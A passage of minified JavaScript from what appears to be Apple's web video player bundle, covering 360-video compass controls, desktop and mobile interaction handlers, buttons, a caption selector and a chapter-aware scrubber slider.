this.compassArrowBottom:this._arrowControls.downArrowDown(e),this._arrowControls.downArrowUp(e)}}},{key:"_onFocusIn",value:function(e){e.target!==this.compass&&this._showCompassArrows()}},{key:"_onFocusOut",value:function(e){this._hideCompassArrows()}},{key:"_onCompassFocusIn",value:function(e){this._rotateFieldOfViewToOrigin()}},{key:"_onCompassFocusOut",value:function(e){var t=this._get360HorizontalAngle();this.compassField.style.transform="rotate("+t+"deg)"}},{key:"_rotateFieldOfViewToOrigin",value:function(){var e=this._get360HorizontalAngle();this.compassField.style.transition="transform 0.3s ease",this.compassField.style.transform=e>180?"rotate(360deg)":e<-180?"rotate(-360deg)":"rotate(0deg)"}},{key:"_onCompassMouseEnter",value:function(e){this._hovering=!0,this._compassIsRotating||this._rotateFieldOfViewToOrigin()}},{key:"_onCompassMouseLeave",value:function(e){if(this._hovering=!1,!this._compassIsRotating){var t=this._get360HorizontalAngle();this.compassField.style.transition="transform 0.3s ease",this.compassField.style.transform="rotate("+t+"deg)"}}},{key:"_on360PositionChange",value:function(){var e=this._get360HorizontalAngle();this.compassRing.style.transition="none",this.compassRing.style.transform="rotate("+e+"deg)",this._hovering||(this.compassField.style.transition="none",this.compassField.style.transform="rotate("+e+"deg)")}},{key:"_get360HorizontalAngle",value:function(){return this._player.get360().position.lon%360}},{key:"destroy",value:function(){this._removeEventListeners()}}]),e}();t.exports=c},{"@marcom/ac-360":14,"@marcom/ac-keyboard/Keyboard":303,"@marcom/useragent-detect":435}],349:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this._player=t.player,this.el=this._player.el,this._showControls=t.showControls,this._hideControls=t.hideControls,this._raiseControls=t.raiseControls,this._lowerControls=t.lowerControls,this._sendMouseDown=t.sendMouseDown,this._controls=this._player.controls,this._controlsVisible=t.controlsVisible,this._controlsTimeoutDuration=t.controlsTimeoutDuration,this._keyboardControl=t.keyboardControl,this._lastMouseCoords={},this._elementEmitter=t.elementEmitter,this._bindMethods(),this._addEventListeners()}return i(e,[{key:"_bindMethods",value:function(){this._onUserInteraction=this._onUserInteraction.bind(this),this._onFullscreenChange=this._onFullscreenChange.bind(this),this._onFullscreenWillExit=this._onFullscreenWillExit.bind(this),this._onMouseOut=this._onMouseOut.bind(this),this._onMouseLeave=this._onMouseLeave.bind(this),this._onClick=this._onClick.bind(this),this._onFocusIn=this._onFocusIn.bind(this),this._onFocusOut=this._onFocusOut.bind(this),this._onUserInteractionTimeout=this._onUserInteractionTimeout.bind(this)}},{key:"_addEventListeners",value:function(){this._controls.el.addEventListener("mousemove",this._onUserInteraction,!0),this._controls.el.addEventListener("click",this._onClick,!0),this._player.on("fullscreen:change",this._onFullscreenChange),this._player.on("fullscreen:willexit",this._onFullscreenWillExit),"onmouseleave"in this.el?this._controls.el.addEventListener("mouseleave",this._onMouseLeave):this._controls.el.addEventListener("mouseout",this._onMouseOut,!0),this._keyboardControl&&this._keyboardControl.on("keyboardinteraction",this._onUserInteraction),this._elementEmitter.on("focusin",this._onFocusIn),this._elementEmitter.on("focusout",this._onFocusOut)}},{key:"_removeEventListeners",value:function(){this._controls.el.removeEventListener("mousemove",this._onUserInteraction,!0),this._controls.el.removeEventListener("click",this._onClick,!0),this._player.off("fullscreen:change",this._onFullscreenChange),this._player.off("fullscreen:willexit",this._onFullscreenWillExit),"onmouseleave"in this.el?this._controls.el.removeEventListener("mouseleave",this._onMouseLeave):this._controls.el.removeEventListener("mouseout",this._onMouseOut,!0),this._keyboardControl&&this._keyboardControl.off("keyboardinteraction",this._onUserInteraction),this._elementEmitter.off("focusin",this._onFocusIn),this._elementEmitter.off("focusout",this._onFocusOut)}},{key:"_shouldIgnoreUserInteraction",value:function(e){return!!(e&&"focusin"!==e.type&&e.target&&this._isActiveArea(e.target))}},{key:"_onUserInteraction",value:function(e,t){!e||"click"!==e.type&&"focusin"!==e.type||this._player.isCaptionsSelectorShowing()&&!e.target.classList.contains("controls-text-tracks-toggle-button")&&"radio"!==e.target.getAttribute("role")&&"radiogroup"!==e.target.getAttribute("role")&&this._player.hideCaptionsSelector(),!this._player.getCurrentSrc()||this._preventUserInteraction||!t&&e&&"mousemove"===e.type&&this._lastMouseCoords.x===e.screenX&&this._lastMouseCoords.y===e.screenY||(e&&e.pageX&&(this._lastMouseCoords={x:e.screenX,y:e.screenY}),this._showControls(),this._raiseControls(),clearTimeout(this._userInteractionTimeout),this._shouldIgnoreUserInteraction(e)||(this._userInteractionTimeout=window.setTimeout(this._onUserInteractionTimeout,this._controlsTimeoutDuration)))}},{key:"_onUserInteractionTimeout",value:function(){this._hideControls()}},{key:"_onMouseLeave",value:function(e){window.clearTimeout(this._userInteractionTimeout),this._hideControls(),this._lowerControls(),this._lastMouseCoords={}}},{key:"_onMouseOut",value:function(e){this._controls.el.contains(e.target)||e.target===this._controls.el||this._onMouseLeave()}},{key:"_isActiveArea",value:function(e){for(;e!==this.el;){if(e.hasAttribute("data-acv-active-area"))return!0;e=e.parentNode}return!1}},{key:"_onClick",value:function(e){this._hasFocus=!1,this._onUserInteraction(e)}},{key:"_onFullscreenWillExit",value:function(){this.controls&&(this.controls.el.display="none")}},{key:"_onFullscreenChange",value:function(){var e=this;this.controls&&(this.controls.el.display=""),this._hideControls(),this._lowerControls(),this._preventUserInteraction=!0,this._fullscreenChangeTimeout=setTimeout((function(){e._preventUserInteraction=!1,e._player.refreshSize()}),750),this._player.refreshSize()}},{key:"_onFocusIn",value:function(e){clearTimeout(this._focusOutTimer),this._focusOutTimer=null,this._hasFocus=!0,this._onUserInteraction(e)}},{key:"_onFocusOut",value:function(e){var t=this;this._focusOutTimer=setTimeout((function(){t._hasFocus&&!t.el.contains(document.activeElement)&&(t._hasFocus=!1,t._hideControls(),t._lowerControls())}),100)}},{key:"destroy",value:function(){clearTimeout(this._focusOutTimer),clearTimeout(this._fullscreenChangeTimeout),clearTimeout(this._userInteractionTimeout),this._removeEventListeners()}}]),e}();t.exports=r},{}],350:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},o=function(e){function t(e){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var n=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e));return n._showCompass=e.showCompass,n._hideCompass=e.hideCompass,n._threesixtyElementsTimeoutDuration=e.threesixtyElementsTimeoutDuration||3e3,n._dragEndThreshold=500,n._mouseDownPosition=null,n}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_bindMethods",value:function(){r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_bindMethods",this).call(this),this._onMouseDown=this._onMouseDown.bind(this),this._onMouseUp=this._onMouseUp.bind(this),this._onDragging=this._onDragging.bind(this),this._onClick=this._onClick.bind(this)}},{key:"_addEventListeners",value:function(){r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_addEventListeners",this).call(this),this._controls.el.addEventListener("mousedown",this._onMouseDown),this._controls.el.addEventListener("click",this._onClick)}},{key:"_removeEventListeners",value:function(){r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_removeEventListeners",this).call(this),this._controls.el.removeEventListener("mousedown",this._onMouseDown)}},{key:"_onUserInteraction",value:function(e){this._userWasRecentlyDragging||e&&"mousemove"===e.type&&this._lastMouseCoords.x===e.screenX&&this._lastMouseCoords.y===e.screenY||this._dragging||(this._showCompass(),clearTimeout(this._userHideMouse),r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_onUserInteraction",this).call(this))}},{key:"_onUserInteractionTimeout",value:function(){var e=this;r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_onUserInteractionTimeout",this).call(this),clearTimeout(this._userHideMouse),this._userHideMouse=setTimeout((function(){e._hideCompass()}),this._threesixtyElementsTimeoutDuration)}},{key:"_onDragging",value:function(e){var t=this;!this._dragging&&this._isActiveArea(e.target)||(this._dragging=!0,this._player.el.classList.add("dragging"),this._player.el.classList.add("recently-dragging"),this._recentDragTimeout=setTimeout((function(){t._dragging&&(t._hideControls(),t._userWasRecentlyDragging=!0,clearTimeout(t._dragTimer),t._dragTimer=setTimeout((function(){t._userWasRecentlyDragging=!1,t._player.el.classList.remove("recently-dragging")}),t._dragEndThreshold))}),30),clearTimeout(this._userInteractionTimeout),clearTimeout(this._userHideMouse))}},{key:"_isDraggable",value:function(e){return-1!==[this._player.controls.compass.el,this._player.controls.playButtonElement].indexOf(e)||this._player.controls.compass.el.contains(e)}},{key:"_onMouseDown",value:function(e){this._isActiveArea(e.target)&&this._controlsVisible()&&!this._isDraggable(e.target)||!this._isPlayingState()||(this._showControls(),clearTimeout(this._userHideMouse),clearTimeout(this._recentDragTimeout),this._player.el.classList.remove("dragging"),this._player.el.classList.remove("recently-dragging"),this._mouseDownPosition={x:e.x,y:e.y},window.addEventListener("mouseup",this._onMouseUp),window.addEventListener("mousemove",this._onDragging),this._sendMouseDown(e))}},{key:"_onMouseUp",value:function(e){window.removeEventListener("mousemove",this._onDragging),window.removeEventListener("mouseup",this._onMouseUp),this._dragging&&this._onUserInteractionTimeout(),this._player.el.contains(e.target)||this._hideCompass(),this._player.el.classList.remove("dragging"),this._dragging=!1}},{key:"_onMouseLeave",value:function(e){r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_onMouseLeave",this).call(this),this._userWasRecentlyDragging=!1,this._dragging||(clearTimeout(this._userHideMouse),this._hideCompass())}},{key:"_onClick",value:function(e){this._player.controls.compass.el.contains(e.target)&&this._userWasRecentlyDragging&&e.stopPropagation(),e.target!==this._player.controls.playButtonElement.parentElement&&e.target!==this._controls.el.firstElementChild||null===this._mouseDownPosition||this._mouseDownPosition.x!==e.x||this._mouseDownPosition.y!==e.y||(this._mouseDownPosition=null,this._mouseDownTime=1/0,this._dragging=!1,this._userWasRecentlyDragging=!1,clearTimeout(this._dragTimer),clearTimeout(this._recentDragTimeout))}},{key:"_isPlayingState",value:function(){return!this._player.controls.el.classList.contains("start-state")&&!this._player.controls.el.classList.contains("end-state")}}]),t}(e("./DefaultControlsInteraction"));t.exports=o},{"./DefaultControlsInteraction":349}],351:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},o=function(e){function t(e){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var n=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e));return n._controlsVisible=e.controlsVisible,n}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_bindMethods",value:function(){r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_bindMethods",this).call(this),this._onTouchStart=this._onTouchStart.bind(this),this._onTouchEnd=this._onTouchEnd.bind(this),this._onClick=this._onClick.bind(this)}},{key:"_addEventListeners",value:function(){this._controls.el.addEventListener("touchstart",this._onTouchStart,{passive:!1}),this._controls.el.addEventListener("click",this._onClick),this._controls.el.addEventListener("focusin",this._onFocusIn),this._controls.el.addEventListener("focusout",this._onFocusOut)}},{key:"_removeEventListeners",value:function(){this._controls.el.removeEventListener("touchstart",this._onTouchStart),this._controls.el.removeEventListener("touchend",this._onTouchEnd),this._controls.el.removeEventListener("click",this._onClick),this._controls.el.removeEventListener("focusin",this._onFocusIn),this._controls.el.removeEventListener("focusout",this._onFocusOut)}},{key:"_onDragging",value:function(e){r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_onDragging",this).call(this,e)}},{key:"_shouldIgnoreUserInteraction",value:function(e){return!1}},{key:"_onClick",value:function(e){e.target!==this._player.controls.compass.compassView&&(this._controlsVisible()?this._isActiveArea(e.target)||(this._hideControls(),this._hideCompass()):this._onUserInteraction(e))}},{key:"_onTouchStart",value:function(e){e.target!==this._player.controls.playButtonElement&&e.target!==this._controls.el.firstElementChild&&e.target!==this._player.controls.compass.compassView&&e.target!==this._player.controls.playButtonElement||(document.addEventListener("touchend",this._onTouchEnd),window.addEventListener("touchmove",this._onDragging),this._showCompass(),this._touchDownTime=Date.now(),this._sendMouseDown(e))}},{key:"_onTouchEnd",value:function(e){document.removeEventListener("touchend",this._onTouchEnd),window.removeEventListener("touchmove",this._onDragging),this._onMouseUp(e)}}]),t}(e("./ThreeSixtyControlsInteraction"));t.exports=o},{"./ThreeSixtyControlsInteraction":350}],352:[function(e,t,n){"use strict";var i=e("@marcom/useragent-detect"),r=i.os.ios||i.os.android,o=e("./DefaultControlsInteraction"),s=e("./ThreeSixtyControlsInteraction"),a=e("./ThreeSixtyMobileControlsInteraction");t.exports=function(e){return e.threesixty?r?new a(e):new s(e):new o(e)}},{"./DefaultControlsInteraction":349,"./ThreeSixtyControlsInteraction":350,"./ThreeSixtyMobileControlsInteraction":351,"@marcom/useragent-detect":435}],353:[function(e,t,n){"use strict";var i=function(e){function t(e){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),t}(e("../../dom-emitter/DOMEmitterMicro"));t.exports=i},{"../../dom-emitter/DOMEmitterMicro":309}],354:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.el=t}return i(e,[{key:"show",value:function(){this.el.classList.remove("hidden")}},{key:"hide",value:function(){this.el.classList.add("hidden")}},{key:"destroy",value:function(e){}}]),e}();t.exports=r},{}],355:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.el=t}return i(e,[{key:"setText",value:function(e){this.el.innerHTML=e}}]),e}();t.exports=r},{}],356:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=e("../../dom-emitter/DOMEmitterMicro"),o=e("@marcom/ac-keyboard/Keyboard"),s=e("@marcom/ac-keyboard/keyMap"),a=function(e){function t(e){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var n=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e));return n.el=e,n._keyboard=new o(n.el),n._addEventListeners(),n}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_addEventListeners",value:function(){this._onClick=this._onClick.bind(this),this._onKeyDown=this._onKeyDown.bind(this),this.el.addEventListener("click",this._onClick),this._keyboard.onDown(s.ARROW_UP,this._onKeyDown),this._keyboard.onDown(s.ARROW_DOWN,this._onKeyDown)}},{key:"_removeEventListeners",value:function(){this.el.removeEventListener("click",this._onClick),this._keyboard.onDown(s.ARROW_UP,this._onKeyDown),this._keyboard.onDown(s.ARROW_DOWN,this._onKeyDown)}},{key:"setItems",value:function(e){var t=this,n=void 0;this.el.innerHTML="",e.forEach((function(e){var i=document.createElement("li");i.setAttribute("role","radio"),e.enabled?(i.classList.add("enabled"),i.setAttribute("aria-checked","true"),i.setAttribute("tabIndex",0),n=i):(i.setAttribute("aria-checked","false"),i.setAttribute("tabIndex",-1)),i.innerText=e.label,i.acvMetadata=e,t.el.appendChild(i)})),n&&n.focus()}},{key:"_onKeyDown",value:function(e){var t=e.target,n=!1;parseInt(e.keyCode)===s.ARROW_DOWN?n=t.nextSibling:parseInt(e.keyCode)===s.ARROW_UP&&(n=t.previousSibling),n&&(this.trigger("ItemSelected",n.acvMetadata),e.preventDefault(),e.stopPropagation())}},{key:"_onClick",value:function(e){this.el!==e.target&&this.el.contains(e.target)&&this.trigger("ItemSelected",e.target.acvMetadata)}},{key:"show",value:function(){this.el.parentElement.classList.remove("hidden")}},{key:"hide",value:function(){this.el.parentElement.classList.add("hidden")}},{key:"destroy",value:function(){this._removeEventListeners()}}]),t}(r);t.exports=a},{"../../dom-emitter/DOMEmitterMicro":309,"@marcom/ac-keyboard/Keyboard":303,"@marcom/ac-keyboard/keyMap":306}],357:[function(e,t,n){"use strict";var i=e("@marcom/ac-slider").Slider,r=e("../chapters/ChapterView"),o="ac-slider-inactive",s="invert-element",a=function(e,t){if(this.el=e,this._min=t.min||0,this._max=t.max||1,t.mixins)for(var n=t.mixins.slice(0);n.length;)Object.assign(this,n.pop());this._slider=new i(this.el,{template:t.template,min:this._min,max:this._max,step:isNaN(+this.el.getAttribute("step"))?this.el.getAttribute("step"):+this.el.getAttribute("step"),value:void 0!==t.value?t.value:+this.el.getAttribute("value"),orientation:t.orientation,renderedPosition:!0,keyboardContext:this.el}),this._onFocusChange=this._onFocusChange.bind(this),this._setHoveringValue=this._setHoveringValue.bind(this),this._onMouseOver=this._onMouseOver.bind(this),this._onMouseLeave=this._onMouseLeave.bind(this),this._onChapterClicked=this._onChapterClicked.bind(this),this._onChapterFocusIn=this._onChapterFocusIn.bind(this),this._onChapterFocusOut=this._onChapterFocusOut.bind(this),this._slider.el.addEventListener("blur",this._onFocusChange),this._slider.el.addEventListener("focus",this._onFocusChange),this._slider.el.addEventListener("mouseout",this._onFocusChange),this._onGrab=this._onGrab.bind(this),this._onRelease=this._onRelease.bind(this),this._slider.on("grab",this._onGrab),this._slider.on("release",this._onRelease),this._scrubbedEl=this.el.querySelector(".ac-slider-scrubbed"),this._notchEl=this.el.querySelector(".ac-slider-hover-notch"),this._chapterContainer=this.el.querySelector(".ac-slider-chapters-track"),this._axTrack=this.el.querySelector(".ac-slider-ax-track"),this._bufferedTrack=this.el.querySelector(".ac-slider-buffered"),this._notchEl&&(this._slider.el.addEventListener("mouseover",this._onMouseOver),this._slider.el.addEventListener("mouseleave",this._onMouseLeave),this._slider.el.addEventListener("mousemove",this._setHoveringValue)),this._axTrack&&(this._axTrack.tabIndex=0,this._slider.el.tabIndex=-1,this._slider.el.setAttribute("aria-hidden",""),this._slider.el.removeAttribute("aria-label"),this._slider.el.removeAttribute("role")),t.value&&requestAnimationFrame(function(){this._slider&&this.setValue(t.value)}.bind(this))},c=a.prototype;c.on=function(){return this._slider.on.apply(this._slider,arguments)},c.off=function(){return this._slider.off.apply(this._slider,arguments)},c.trigger=function(){return this._slider.trigger.apply(this._slider,arguments)},c.setValue=function(e){return this._axTrack&&this._axTrack.setAttribute("aria-valuenow",e),this._slider.setValue.call(this._slider,e)},c.setAriaValueText=function(e){this._axTrack?this._axTrack.setAttribute("aria-valuetext",e):this._slider.el.setAttribute("aria-valuetext",e)},c.setMin=function(e){this._min=e,this._slider.setMin(e)},c.setMax=function(e){this._max=e,this._slider.setMax(e)},c._onMouseOver=function(){this._slider.el.classList.add("hover")},c._onMouseLeave=function(){this._slider.el.classList.remove("hover")},c._onFocusChange=function(){setTimeout(function(){this.trigger("focuschange")}.bind(this),0)},c.isFocused=function(){return this._slider.el===document.activeElement&&this._hasFocusOutline()},c._hasFocusOutline=function(){return"none"!==getComputedStyle(this._slider.el).getPropertyValue("outline-style")},c.getValue=function(){return this._slider.getValue.apply(this._slider,arguments)},c.getMax=function(){return this._max},c.setScrubbedValue=function(){this._chapters&&this._checkCollisionsSetValue(),"horizontal"===this._slider.getOrientation()?this._scrubbedEl.style.left=this._slider.thumbElement.style.left:this._scrubbedEl.style.bottom=this._slider.thumbElement.style.bottom},c.setBufferedValue=function(e){this._bufferedTrack.style.left=e+"%"},c._checkCollisionsSetValue=function(){for(var e=0;e<this._chapters.length;e++){var t=this._chapters[e].el.children[0],n=parseInt(this._chapters[e].el.style.left)<this.getValue()/this.getMax()*100;this._setInlineBackgroundColor(!n,t)}},c._setHoveringValue=function(e){var t=this.getClientXValue(e,this._notchEl),n=t>this.getValue();this._notchEl.style.left=t/this.getMax()*100+"%",this._setInlineBackgroundColor(n,this._notchEl)},c._setInlineBackgroundColor=function(e,t){e?t.classList.remove(s):t.classList.add(s)},c._onChapterClicked=function(e){this.trigger("chapter:click",e),this._slider.thumbElement.style.pointerEvents=""},c._onChapterFocusIn=function(e){this._notchEl.classList.add("hidden"),this._slider.thumbElement.style.pointerEvents="none",this.trigger("chapter:focusin",e)},c._onChapterFocusOut=function(e){this._notchEl.classList.remove("hidden"),this._slider.thumbElement.style.pointerEvents="",this.trigger("chapter:focusout",e)},c._onGrab=function(){this.forceCursorPointer(),this.setScrubbedValue()},c._onRelease=function(){this.disableForcedCursorPointer(),this.setScrubbedValue()},c.setChapters=function(e){var t=this;this._chapters&&this._chapters.forEach((function(e){e.off("click",t._onChapterClicked),e.off("focusin",t._onChapterFocusIn),e.off("focusout",t._onChapterFocusOut),e.off("mouseover",t._onChapterFocusIn),e.off("mouseout",t._onChapterFocusOut),e.destroy()})),this._chapterContainer.innerHTML="",this._chapters=[];for(var n=0;n<e.length;n++)if(e[n].startTime<100){var i=new r(e[n]);i.on("click",this._onChapterClicked),i.on("focusin",this._onChapterFocusIn),i.on("focusout",this._onChapterFocusOut),i.on("mouseover",this._onChapterFocusIn),i.on("mouseout",this._onChapterFocusOut),this._chapters.push(i),this._chapterContainer.appendChild(i.el)}},c.show=function(){this.el.classList.remove(o)},c.hide=function(){this.el.classList.add(o)},c.setState=function(e){this.el.classList.add(e)},c.clearState=function(e){this.el.classList.remove(e)},c.getClientXValue=function(e,t){return this._slider.getClientXValue(e,t)},c.destroy=function(){var e=this;this._chapters&&this._chapters.forEach((function(t){t.off("click",e._onChapterClicked),t.off("focusin",e._onChapterFocusIn),t.off("focusout",e._onChapterFocusOut),t.off("mouseover",e._onChapterFocusIn),t.off("mouseout",e._onChapterFocusOut),t.destroy()})),this._slider.el.removeEventListener("mousemove",this._setHoveringValue),this._slider.el.removeEventListener("mouseleave",this._onMouseOver),this._slider.el.removeEventListener("mouseout",this._onMouseLeave),this._slider.el.removeEventListener("blur",this._onFocusChange),this._slider.el.removeEventListener("focus",this._onFocusChange),this._slider.el.removeEventListener("mouseout",this._onFocusChange),this._slider.off("grab",this._onGrab),this._slider.off("release",this._onRelease),this._slider.destroy(),this._slider=null},t.exports=a},{"../chapters/ChapterView":347,"@marcom/ac-slider":267}],358:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var i=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return i._states=n.states||{},i._labels=n.labels,i._focusTarget=i.el.querySelector("button")||i.el,i._states&&i._states.initial&&i.setState("initial"),i}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"setState",value:function(e){this._currentState&&this._currentState!==e&&this._states[this._currentState].length&&this.el.classList.remove(this._states[this._currentState]),this._currentState=e,this._labels&&this._labels[this._currentState]&&(this._focusTarget.value=this._labels[this._currentState],this._focusTarget.setAttribute("aria-label",this._labels[this._currentState])),this._states[e].length&&this.el.classList.add(this._states[e])}}]),t}(e("./Button"));t.exports=r},{"./Button":353}],359:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},o=function(e){function t(e,n){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"setState",value:function(e){r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"setState",this).call(this,e),"on"===this._currentState?this._focusTarget.setAttribute("aria-pressed",!0):this._focusTarget.setAttribute("aria-pressed",!1)}}]),t}(e("./StatefulButton"));t.exports=o},{"./StatefulButton":358}],360:[function(e,t,n){"use strict";var i="cursor-pointer";t.exports={disableForcedCursorPointer:function(){document.body.classList.remove(i),this.onSelectStartResumeDefault()},forceCursorPointer:function(){document.body.classList.add(i),this.onSelectStartPreventDefault()},onSelectStartResumeDefault:function(){document.removeEventListener("selectstart",this.preventDefault)},onSelectStartPreventDefault:function(){document.addEventListener("selectstart",this.preventDefault)},preventDefault:function(e){e.preventDefault()}}},{}],361:[function(e,t,n){"use strict";var i=e("../templates/states/EndStateItem.html"),r=function(e){this.el=e.el,this.el.innerHTML=i,this._player=e.player,this._bindContent(e)},o=r.prototype;o._bindContent=function(e){if("link"===e.type||"video"===e.type){var t=this.el.querySelector(".end-state-link"),n=document.createElement("div");t.classList.remove("hidden"),n.classList.add("end-state-text-container"),n.innerText=e.label||"",t.href=e.url||"",t.appendChild(n),"link"===e.type?t.classList.add("icon","icon-after","icon-chevronright"):"video"===e.type&&t.classList.add("icon","icon-after","icon-playcircle"),this._bindAction(this.el,e)}},o._bindAction=function(e,t){"function"==typeof t.onclick?e.onclick=function(e){e.preventDefault(),t.onclick.call(null,e)}.bind(this):"video"===t.type&&t.url&&(e.onclick=function(e){e.preventDefault(),this._player.load(t.url,null,0,{})}.bind(this))},o.destroy=function(){},t.exports=r},{"../templates/states/EndStateItem.html":382}],362:[function(e,t,n){"use strict";var 